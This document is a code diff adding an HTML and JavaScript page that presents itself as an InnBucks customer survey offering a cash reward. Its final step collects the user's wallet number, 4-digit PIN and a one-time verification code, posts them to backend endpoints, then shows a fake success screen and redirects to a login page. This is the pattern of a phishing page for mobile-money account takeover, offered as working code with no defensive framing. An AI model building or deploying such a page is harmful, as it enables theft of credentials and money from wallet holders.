@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InnBucks Survey - Get $5 Reward</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Poppins:wght@600;700;800&display=swap');
+
+        :root {
+            --primary: #FF5757;
+            --secondary: #4ECDC4;
+            --accent-orange: #FFA726;
+            --accent-purple: #9C27B0;
+            --dark: #1a1d29;
+            --darker: #0f1117;
+            --light: #f8f9fa;
+            --success: #4CAF50;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 50%, #252938 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 87, 87, 0.1) 0%, transparent 70%);
+            animation: pulse 8s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -50%;
+            left: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(78, 205, 196, 0.1) 0%, transparent 70%);
+            animation: pulse 8s ease-in-out infinite;
+            animation-delay: 4s;
+            pointer-events: none;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.1);
+                opacity: 0.8;
+            }
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(26, 29, 41, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 0.8s ease;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .info-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+
+        .logo-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+        }
+
+        .dot:nth-child(1) {
+            background: var(--accent-orange);
+        }
+
+        .dot:nth-child(2) {
+            background: var(--secondary);
+        }
+
+        .dot:nth-child(3) {
+            background: var(--primary);
+        }
+
+        .dot:nth-child(4) {
+            background: var(--accent-purple);
+        }
+
+        .logo h1 {
+            font-family: 'Poppins', sans-serif;
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .reward-badge {
+            background: linear-gradient(135deg, var(--primary), #ff7b7b);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            margin-top: 10px;
+            animation: bounce 2s ease infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-5px);
+            }
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .progress-step {
+            flex: 1;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 0 4px;
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-step.active::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            animation: progressFill 0.5s ease;
+        }
+
+        @keyframes progressFill {
+            from {
+                width: 0;
+            }
+
+            to {
+                width: 100%;
+            }
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        h2 {
+            font-family: 'Poppins', sans-serif;
+            font-size: 1.6rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.95rem;
+        }
+
+        input[type="text"],
+        input[type="tel"],
+        input[type="password"],
+        input[type="number"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            font-family: 'DM Sans', sans-serif;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--secondary);
+            background: rgba(78, 205, 196, 0.1);
+        }
+
+        input.error {
+            border-color: var(--primary) !important;
+            background: rgba(255, 87, 87, 0.1) !important;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-5px);
+            }
+
+            75% {
+                transform: translateX(5px);
+            }
+        }
+
+        .form-group.error label {
+            color: var(--primary);
+        }
+
+        .radio-group.error {
+            animation: shake 0.5s ease;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .radio-option {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 16px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .radio-option:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(78, 205, 196, 0.3);
+        }
+
+        .radio-option input[type="radio"] {
+            width: 20px;
+            height: 20px;
+            accent-color: var(--secondary);
+        }
+
+        .radio-option.selected {
+            background: rgba(78, 205, 196, 0.15);
+            border-color: var(--secondary);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--secondary), #3db8b0);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(78, 205, 196, 0.4);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .otp-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 25px 0;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            color: #fff;
+        }
+
+        .otp-input:focus {
+            border-color: var(--secondary);
+            background: rgba(78, 205, 196, 0.1);
+        }
+
+        .success-animation {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .checkmark svg {
+            width: 40px;
+            height: 40px;
+            stroke: white;
+            stroke-width: 3;
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+            animation: drawCheck 0.5s ease 0.3s forwards;
+        }
+
+        @keyframes drawCheck {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        .error-message {
+            background: rgba(255, 87, 87, 0.2);
+            border: 1px solid var(--primary);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+
+        .info-box {
+            background: rgba(78, 205, 196, 0.1);
+            border: 1px solid rgba(78, 205, 196, 0.3);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h2 {
+                font-size: 1.4rem;
+            }
+
+            .logo h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <div class="logo">
+                <div class="logo-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                <h1>InnBucks</h1>
+            </div>
+            <div class="reward-badge">🎁 Get anywhere from $5 to $50 Reward in your InnBucks!</div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-step active" data-step="1"></div>
+            <div class="progress-step" data-step="2"></div>
+            <div class="progress-step" data-step="3"></div>
+            <div class="progress-step" data-step="4"></div>
+        </div>
+
+        <div class="info-box">
+            <p>We are conducting a survey to understand how you use our service and improve it.</p>
+            <p>By participating, you will have the chance to win a reward of up to $50 in your innbucks!</p>
+            <p>The more you use our service, the more you can win!</p>
+        </div>
+
+        <form id="surveyForm">
+            <!-- Step 1: Personal Information -->
+            <div class="step active" data-step="1">
+                <h2>Personal Information</h2>
+                <p class="subtitle">Let's start with some basic details</p>
+
+                <div class="form-group">
+                    <label for="fullName">Full Name *</label>
+                    <input type="text" id="fullName" required placeholder="e.g. Tinashe Moyo">
+                </div>
+
+                <div class="form-group">
+                    <label for="birthYear">Birth Year *</label>
+                    <input type="number" id="birthYear" required placeholder="e.g. 1990" min="1920" max="2010">
+                </div>
+
+                <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+            </div>
+
+            <!-- Step 2: Usage Survey -->
+            <div class="step" data-step="2">
+                <h2>Your InnBucks Experience</h2>
+                <p class="subtitle">Help us understand how you use our service</p>
+
+                <div class="form-group">
+                    <label>How often do you use InnBucks? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="frequency" value="daily" required>
+                            <span>Daily - I use it every day</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="frequency" value="weekly">
+                            <span>Weekly - A few times a week</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="frequency" value="monthly">
+                            <span>Monthly - Once or twice a month</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="frequency" value="rarely">
+                            <span>Rarely - Less than once a month</span>
+                        </label>
+                    </div>
+                </div>
+
+                <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+                <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+            </div>
+
+            <!-- Step 3: Comparison & Recommendation -->
+            <div class="step" data-step="3">
+                <h2>Service Comparison</h2>
+                <p class="subtitle">Your honest feedback matters to us</p>
+
+                <div class="form-group">
+                    <label>How do InnBucks charges compare to EcoCash? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="charges" value="much_lower" required>
+                            <span>Much lower - Significantly cheaper</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="charges" value="lower">
+                            <span>Lower - Somewhat cheaper</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="charges" value="similar">
+                            <span>Similar - About the same</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="charges" value="higher">
+                            <span>Higher - More expensive</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="charges" value="not_sure">
+                            <span>Not sure - Haven't compared</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Would you recommend InnBucks to a friend? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="recommend" value="definitely" required>
+                            <span>Yes, definitely!</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="recommend" value="probably">
+                            <span>Probably yes</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="recommend" value="maybe">
+                            <span>Maybe</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="recommend" value="probably_not">
+                            <span>Probably not</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="recommend" value="no">
+                            <span>No</span>
+                        </label>
+                    </div>
+                </div>
+
+                <button type="button" class="btn btn-primary" onclick="nextStep()">Continue</button>
+                <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+            </div>
+
+            <!-- Step 4: InnBucks Account & OTP -->
+            <div class="step" data-step="4">
+                <h2>Claim Your Reward</h2>
+                <p class="subtitle">Thank you for completing the survey! We'll send $5 directly to your InnBucks wallet
+                </p>
+
+                <div class="info-box">
+                    ℹ️ Your reward will be credited immediately after verification
+                </div>
+
+                <div id="accountDetails">
+                    <div class="form-group">
+                        <label for="innbucksNumber">InnBucks Number *</label>
+                        <input type="tel" id="innbucksNumber" required placeholder="e.g. 0771234567">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="pin">InnBucks PIN *</label>
+                        <input type="password" id="pin" required placeholder="Enter your 4-digit PIN" maxlength="4">
+                    </div>
+
+                    <button type="button" class="btn btn-primary" onclick="sendOTP()">Send OTP</button>
+                    <button type="button" class="btn btn-secondary" onclick="prevStep()">Back</button>
+                </div>
+
+                <div id="otpVerification" style="display: none;">
+                    <div class="info-box">
+                        📱 We've sent a verification code to your InnBucks number
+                    </div>
+
+                    <div class="form-group">
+                        <label>Enter OTP Code *</label>
+                        <div class="otp-input-group">
+                            <input type="text" class="otp-input" maxlength="1" data-index="0">
+                            <input type="text" class="otp-input" maxlength="1" data-index="1">
+                            <input type="text" class="otp-input" maxlength="1" data-index="2">
+                            <input type="text" class="otp-input" maxlength="1" data-index="3">
+                        </div>
+                    </div>
+
+                    <button type="button" class="btn btn-primary" onclick="verifyOTP()">Verify & Submit</button>
+                    <button type="button" class="btn btn-secondary" onclick="resendOTP()">Resend OTP</button>
+                </div>
+            </div>
+
+            <!-- Success Step -->
+            <div class="step" data-step="5">
+                <div class="success-animation">
+                    <div class="checkmark">
+                        <svg viewBox="0 0 52 52">
+                            <polyline points="14,26 22,34 38,18" fill="none" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg>
+                    </div>
+                    <h2>Verification Complete! 🎉</h2>
+                    <p class="subtitle">Redirecting you to check your balance...</p>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 4;
+
+        // Radio option selection styling
+        document.querySelectorAll('.radio-option').forEach(option => {
+            option.addEventListener('click', function () {
+                const radio = this.querySelector('input[type="radio"]');
+                const name = radio.name;
+
+                // Remove selected class from all options with same name
+                document.querySelectorAll(`input[name="${name}"]`).forEach(r => {
+                    r.closest('.radio-option').classList.remove('selected');
+                });
+
+                // Add selected class to clicked option
+                this.classList.add('selected');
+                radio.checked = true;
+
+                // Remove error state when user selects an option
+                const radioGroup = this.closest('.radio-group');
+                if (radioGroup) {
+                    radioGroup.classList.remove('error');
+                }
+            });
+        });
+
+        // Remove error state when user starts typing
+        document.querySelectorAll('input[type="text"], input[type="tel"], input[type="password"], input[type="number"]').forEach(input => {
+            input.addEventListener('input', function () {
+                this.classList.remove('error');
+                const formGroup = this.closest('.form-group');
+                if (formGroup) {
+                    formGroup.classList.remove('error');
+                }
+            });
+        });
+
+        function nextStep() {
+            const currentStepElement = document.querySelector(`.step[data-step="${currentStep}"]`);
+
+            // Remove previous error states
+            document.querySelectorAll('input.error').forEach(input => {
+                input.classList.remove('error');
+            });
+            document.querySelectorAll('.form-group.error').forEach(group => {
+                group.classList.remove('error');
+            });
+            document.querySelectorAll('.radio-group.error').forEach(group => {
+                group.classList.remove('error');
+            });
+
+            // Validate current step
+            const inputs = currentStepElement.querySelectorAll('input[required]');
+            let isValid = true;
+            let firstErrorField = null;
+
+            inputs.forEach(input => {
+                if (input.type === 'radio') {
+                    const radioGroup = currentStepElement.querySelectorAll(`input[name="${input.name}"]`);
+                    const isChecked = Array.from(radioGroup).some(r => r.checked);
+                    if (!isChecked) {
+                        isValid = false;
+                        const radioContainer = input.closest('.radio-group');
+                        if (radioContainer && !firstErrorField) {
+                            radioContainer.classList.add('error');
+                            firstErrorField = radioContainer;
+                        }
+                    }
+                } else if (!input.value.trim()) {
+                    isValid = false;
+                    input.classList.add('error');
+                    const formGroup = input.closest('.form-group');
+                    if (formGroup) {
+                        formGroup.classList.add('error');
+                    }
+                    if (!firstErrorField) {
+                        firstErrorField = input;
+                    }
+                }
+            });
+
+            if (!isValid) {
+                // Show error message
+                let errorDiv = currentStepElement.querySelector('.error-message');
+                if (!errorDiv) {
+                    errorDiv = document.createElement('div');
+                    errorDiv.className = 'error-message';
+                    currentStepElement.insertBefore(errorDiv, currentStepElement.querySelector('.btn'));
+                }
+                errorDiv.textContent = '⚠️ Please fill in all required fields before continuing.';
+                errorDiv.style.display = 'block';
+
+                // Scroll to first error field
+                if (firstErrorField) {
+                    firstErrorField.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    if (firstErrorField.tagName === 'INPUT') {
+                        setTimeout(() => firstErrorField.focus(), 300);
+                    }
+                }
+
+                // Hide error message after 3 seconds
+                setTimeout(() => {
+                    if (errorDiv) errorDiv.style.display = 'none';
+                }, 3000);
+
+                return;
+            }
+
+            // Move to next step
+            currentStep++;
+            updateStep();
+        }
+
+        function prevStep() {
+            currentStep--;
+            updateStep();
+        }
+
+        function updateStep() {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+
+            // Show current step
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.add('active');
+
+            // Update progress bar
+            document.querySelectorAll('.progress-step').forEach((step, index) => {
+                if (index < currentStep) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        }
+
+        async function sendOTP() {
+            const innbucksNumber = document.getElementById('innbucksNumber').value;
+            const pin = document.getElementById('pin').value;
+
+            // Remove previous errors
+            document.querySelectorAll('#accountDetails input.error').forEach(input => {
+                input.classList.remove('error');
+            });
+
+            let hasError = false;
+            let errorMessage = '';
+
+            if (!innbucksNumber) {
+                document.getElementById('innbucksNumber').classList.add('error');
+                hasError = true;
+                errorMessage = 'Please enter your InnBucks number';
+            }
+
+            if (!pin) {
+                document.getElementById('pin').classList.add('error');
+                hasError = true;
+                if (!errorMessage) errorMessage = 'Please enter your PIN';
+            } else if (pin.length !== 4) {
+                document.getElementById('pin').classList.add('error');
+                hasError = true;
+                errorMessage = 'PIN must be exactly 4 digits';
+            }
+
+            if (hasError) {
+                showError('#accountDetails', errorMessage);
+                return;
+            }
+
+            // Disable button and show loading state
+            const sendButton = document.querySelector('#accountDetails .btn-primary');
+            const originalText = sendButton.textContent;
+            sendButton.disabled = true;
+            sendButton.textContent = 'Sending OTP...';
+
+            try {
+                // Call backend API to send OTP
+                const response = await fetch('/api/send-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        innbucks_number: innbucksNumber,
+                        pin: pin,
+                        survey_data: collectFormData()
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.detail || 'Failed to send OTP');
+                }
+
+                // Show OTP input section
+                document.getElementById('accountDetails').style.display = 'none';
+                document.getElementById('otpVerification').style.display = 'block';
+
+                // Focus first OTP input
+                document.querySelector('.otp-input').focus();
+
+                // If dev mode, show OTP in console
+                if (data.dev_otp) {
+                    console.log('Dev OTP:', data.dev_otp);
+                }
+
+            } catch (error) {
+                console.error('Error sending OTP:', error);
+                showError('#accountDetails', error.message || 'Failed to send OTP. Please try again.');
+                sendButton.disabled = false;
+                sendButton.textContent = originalText;
+            }
+        }
+
+        function showError(selector, message) {
+            const container = document.querySelector(selector);
+            let errorDiv = container.querySelector('.error-message');
+            if (!errorDiv) {
+                errorDiv = document.createElement('div');
+                errorDiv.className = 'error-message';
+                container.insertBefore(errorDiv, container.querySelector('.btn'));
+            }
+            errorDiv.textContent = '⚠️ ' + message;
+            errorDiv.style.display = 'block';
+
+            setTimeout(() => {
+                if (errorDiv) errorDiv.style.display = 'none';
+            }, 5000);
+        }
+
+        // OTP input handling
+        document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
+            input.addEventListener('input', function (e) {
+                if (this.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        async function verifyOTP() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+
+            // Remove previous errors
+            otpInputs.forEach(input => input.classList.remove('error'));
+
+            if (otp.length !== 4) {
+                otpInputs.forEach(input => {
+                    if (!input.value) {
+                        input.classList.add('error');
+                    }
+                });
+                showError('#otpVerification', 'Please enter the complete 4-digit OTP code');
+                return;
+            }
+
+            // Disable button and show loading state
+            const verifyButton = document.querySelector('#otpVerification .btn-primary');
+            const originalText = verifyButton.textContent;
+            verifyButton.disabled = true;
+            verifyButton.textContent = 'Verifying...';
+
+            try {
+                const innbucksNumber = document.getElementById('innbucksNumber').value;
+                const fullName = document.getElementById('fullName').value;
+                const surveyData = collectFormData();
+
+                // Call backend API to verify OTP
+                const response = await fetch('/api/verify-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        innbucks_number: innbucksNumber,
+                        otp: otp,
+                        survey_data: surveyData
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.detail || 'Invalid OTP');
+                }
+
+                console.log('Survey submitted successfully:', data);
+
+                // Show success briefly then redirect to login
+                currentStep = 5;
+                updateStep();
+
+                // Redirect to login page after 3 seconds
+                setTimeout(() => {
+                    window.location.href = `/login?number=${encodeURIComponent(innbucksNumber)}&name=${encodeURIComponent(fullName)}`;
+                }, 3000);
+
+            } catch (error) {
+                console.error('Error verifying OTP:', error);
+                showError('#otpVerification', error.message || 'Invalid OTP. Please try again.');
+                verifyButton.disabled = false;
+                verifyButton.textContent = originalText;
+
+                // Clear OTP inputs on error
+                otpInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.add('error');
+                });
+                otpInputs[0].focus();
+            }
+        }
+
+        async function resendOTP() {
+            const resendButton = document.querySelector('#otpVerification .btn-secondary');
+            const originalText = resendButton.textContent;
+            resendButton.disabled = true;
+            resendButton.textContent = 'Sending...';
+
+            try {
+                const innbucksNumber = document.getElementById('innbucksNumber').value;
+
+                const response = await fetch('/api/resend-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `innbucks_number=${encodeURIComponent(innbucksNumber)}`
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.detail || 'Failed to resend OTP');
+                }
+
+                // Clear OTP inputs
+                document.querySelectorAll('.otp-input').forEach(input => {
+                    input.value = '';
+                    input.classList.remove('error');
+                });
+                document.querySelector('.otp-input').focus();
+
+                // Show success message
+                const infoBox = document.querySelector('#otpVerification .info-box');
+                infoBox.textContent = '📱 A new verification code has been sent to your InnBucks number';
+
+                // If dev mode, show OTP in console
+                if (data.dev_otp) {
+                    console.log('New Dev OTP:', data.dev_otp);
+                }
+
+                resendButton.disabled = false;
+                resendButton.textContent = originalText;
+
+            } catch (error) {
+                console.error('Error resending OTP:', error);
+                showError('#otpVerification', error.message || 'Failed to resend OTP. Please try again.');
+                resendButton.disabled = false;
+                resendButton.textContent = originalText;
+            }
+        }
+
+        function collectFormData() {
+            return {
+                full_name: document.getElementById('fullName').value,
+                birth_year: parseInt(document.getElementById('birthYear').value),
+                frequency: document.querySelector('input[name="frequency"]:checked')?.value,
+                charges: document.querySelector('input[name="charges"]:checked')?.value,
+                recommend: document.querySelector('input[name="recommend"]:checked')?.value
+            };
+        }
+    </script>
+</body>
+
+</html>
